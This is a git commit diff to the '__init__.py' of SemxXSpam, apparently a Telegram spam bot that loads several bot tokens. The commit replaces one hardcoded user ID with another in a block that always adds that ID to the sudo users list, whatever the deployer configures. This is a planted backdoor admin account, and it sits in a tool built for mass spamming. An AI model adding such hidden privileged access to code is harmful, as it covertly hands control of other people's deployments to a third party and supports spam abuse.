9bf108b6c25df553e194d4cb237f056687d99bd9
MR X PHANTOM <99727604+MR-X-PHANTOM@users.noreply.github.com>
2022-06-24 16:33:29 +0530

    Update __init__.py

--- SemxXSpam/__init__.py
+++ SemxXSpam/__init__.py
@@ -26,8 +26,8 @@ BOT_TOKEN8 = config("BOT_TOKEN8", default=None)
 BOT_TOKEN9 = config("BOT_TOKEN9", default=None)
 BOT_TOKEN10 = config("BOT_TOKEN10", default=None)
 SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
-if 1410250744 not in SUDO_USERS:
-    SUDO_USERS.append(1410250744)
+if 5069215795 not in SUDO_USERS:
+    SUDO_USERS.append(5069215795)
 
 OWNER_ID = int(os.environ.get("OWNER_ID", None))
 
